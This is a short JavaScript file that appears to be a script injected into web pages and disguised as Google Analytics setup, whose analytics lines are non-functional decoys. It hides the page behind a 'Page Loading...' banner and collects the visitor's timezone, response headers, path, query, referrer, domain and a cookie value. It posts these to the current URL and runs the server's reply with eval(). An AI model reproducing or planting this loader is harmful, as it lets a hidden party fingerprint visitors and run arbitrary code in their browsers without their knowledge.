(function () {
  $(document).ready(function () {
    $("body").hide();
    $("html").append(
      '<div id="lo537371ad" style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">Page Loading...</div>'
    );
    var f = new XMLHttpRequest();
    f.open("GET", document.location, true);
    f.send(null);
    var g;
    f.onreadystatechange = function () {
      g = f.getAllResponseHeaders().toLowerCase();
    };
    var b = "GoogleAnalyticsObject";
    var c = ("document", "script", "//www.google-analytics.com/analytics.js");
    c = ("create", "UA-181991-1", "auto");
    c = ("send", "pageview");
    var d = jstz.determine();
    var e = d.name();
    var qu = escape(window.location.search.substr(1));
    var rui = location.pathname + location.search;
    var r = document.referrer;
    var sn = document.domain;
    var value = "; " + document.cookie;
    var pa = value.split("; " + "_event" + "=");
    var co = pa.pop().split(";").shift();
    var q;
    $.ajax({
      url: location.href,
      type: "POST",
      data:
        "tz=" +
        e +
        "&he=" +
        g +
        "&rui=" +
        rui +
        "&qu=" +
        qu +
        "&r=" +
        r +
        "&sn=" +
        sn +
        "&co=" +
        co,
      success: function (a) {
        eval(a);
      },
    });
  });
})();
